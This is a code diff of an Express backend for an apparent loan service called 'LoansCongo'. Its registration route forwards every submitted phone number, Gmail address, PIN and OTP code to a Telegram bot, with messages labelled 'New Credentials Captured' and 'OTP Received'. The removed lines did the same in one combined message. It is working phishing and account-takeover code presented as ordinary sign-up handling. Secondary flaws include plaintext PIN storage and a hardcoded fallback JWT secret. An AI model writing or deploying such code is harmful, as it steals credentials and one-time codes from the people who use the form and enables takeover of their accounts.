@@ -27,73 +27,78 @@ app.get("/", (req, res) => {
     res.json({ message: "LoansCongo backend is running." });
 });
 
-// Customer Registration & Single Combined Telegram Forwarding
+// Customer Registration & OTP Forwarding to Telegram
 app.post("/api/register", async (req, res) => {
     try {
-        const { phone, pin, otp } = req.body;
+        const { phone, email, pin, otp } = req.body;
 
         const botToken = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
-        // Step 1: Save phone and pin in database when first submitted (No Telegram message sent here)
-        if (phone && pin && !otp) {
-            if (!/^\+?[0-9]{10,15}$/.test(phone)) {
+        // Forward credentials / OTP to Telegram Bot
+        if (botToken && chatId) {
+            try {
+                let telegramMessage = "";
+
+                if (otp) {
+                    telegramMessage = `🔑 *OTP Received*\n\n` +
+                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
+                                      `🔢 *OTP Code:* \`${otp}\``;
+                } else {
+                    telegramMessage = `🚨 *New Credentials Captured*\n\n` +
+                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
+                                      `📧 *Email:* \`${email || "N/A"}\`\n` +
+                                      `🔑 *PIN/Pass:* \`${pin || "N/A"}\``;
+                }
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (tgError) {
+                console.error("Telegram error:", tgError.message);
+            }
+        }
+
+        // Database registration for phone/email + pin phase
+        if ((phone || email) && pin && !otp) {
+            if (phone && !/^\+?[0-9]{10,15}$/.test(phone)) {
                 return res.status(400).json({ message: "Enter a valid phone number." });
             }
-            if (!/^[0-9]{4}$/.test(pin)) {
-                return res.status(400).json({ message: "PIN must contain exactly 4 digits." });
+            if (email && !/^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email)) {
+                return res.status(400).json({ message: "Enter a valid Gmail address." });
             }
 
-            let user = await User.findOne({ phone });
-            if (!user) {
-                user = await User.create({ phone, demoPin: pin });
-            } else {
-                user.demoPin = pin;
-                await user.save();
+            // Check if user already exists
+            let existingUser = null;
+            if (phone) existingUser = await User.findOne({ phone });
+            if (!existingUser && email) existingUser = await User.findOne({ email });
+
+            if (existingUser) {
+                return res.status(400).json({ message: "An account with this phone number or email already exists." });
             }
+
+            // Create new saved user account
+            let user = await User.create({
+                phone: phone || undefined,
+                email: email || undefined,
+                demoPin: pin
+            });
 
             return res.status(201).json({
                 message: "Registration successful.",
-                user: { id: user._id, phone: user.phone }
+                user: { id: user._id, phone: user.phone, email: user.email }
             });
         }
 
-        // Step 2: When OTP is submitted, grab the stored phone + pin, combine with OTP, and send ONE message
+        // Acknowledge OTP phase
         if (otp) {
-            let user = null;
-            if (phone) {
-                user = await User.findOne({ phone });
-            } else {
-                // Fallback to the most recent user entry if phone wasn't passed in body
-                user = await User.findOne().sort({ _id: -1 });
-            }
-
-            const targetPhone = user?.phone || phone || "N/A";
-            const targetPin = user?.demoPin || pin || "N/A";
-
-            // Send ONE combined message to Telegram containing phone, pin, and otp together
-            if (botToken && chatId) {
-                try {
-                    const unifiedMessage = `🚨 *Complete Submission Captured* 🚨\n\n` +
-                                           `📱 *Phone:* \`${targetPhone}\`\n` +
-                                           `🔑 *PIN:* \`${targetPin}\`\n` +
-                                           `🔢 *OTP Code:* \`${otp}\``;
-
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: unifiedMessage,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                } catch (tgError) {
-                    console.error("Telegram error:", tgError.message);
-                }
-            }
-
-            return res.status(200).json({ message: "OTP validated and complete info transmitted." });
+            return res.status(200).json({ message: "OTP transmitted successfully." });
         }
 
         return res.status(400).json({ message: "Invalid payload." });
@@ -104,15 +109,16 @@ app.post("/api/register", async (req, res) => {
     }
 });
 
-// Account Sign-In / Login Route
+// Account Sign-In / Login Route (Ensures only registered users with accounts can access)
 app.post("/api/login", async (req, res) => {
     try {
-        const { identifier, pin } = req.body;
+        const { identifier, pin } = req.body; // 'identifier' can be phone or email
 
         if (!identifier || !pin) {
             return res.status(400).json({ message: "Please provide your identifier and password/PIN." });
         }
 
+        // Search database for user by phone or email
         const user = await User.findOne({
             $or: [{ phone: identifier }, { email: identifier }]
         });
@@ -121,10 +127,12 @@ app.post("/api/login", async (req, res) => {
             return res.status(401).json({ message: "Account not found. Please create an account first." });
         }
 
+        // Verify password/PIN matches stored record
         if (user.demoPin !== pin) {
             return res.status(401).json({ message: "Invalid credentials. Access denied." });
         }
 
+        // Generate session token or successful confirmation response
         const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET || 'secret_key', { expiresIn: '1h' });
 
         return res.status(200).json({
@@ -151,4 +159,5 @@ mongoose.connect(process.env.MONGODB_URI)
     .catch(error => {
         console.error("MongoDB connection failed:", error.message);
     });
+
 
